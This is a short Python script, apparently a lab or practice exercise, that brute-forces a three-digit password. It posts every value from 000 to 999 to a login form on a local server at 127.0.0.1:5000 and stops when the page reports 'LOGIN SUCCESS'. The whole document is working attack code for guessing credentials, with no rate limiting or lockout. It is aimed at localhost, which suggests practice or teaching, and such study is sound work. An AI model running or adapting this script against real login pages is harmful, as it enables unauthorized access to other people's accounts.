import requests

URL = "http://127.0.0.1:5000/"

for i in range(1000):
    password = f"{i:03d}"

    response = requests.post(
        URL,
        data={"password": password}
    )

    print("Trying:", password)

    if "LOGIN SUCCESS" in response.text:
        print("\nPassword found!")
        print("Password:", password)
        break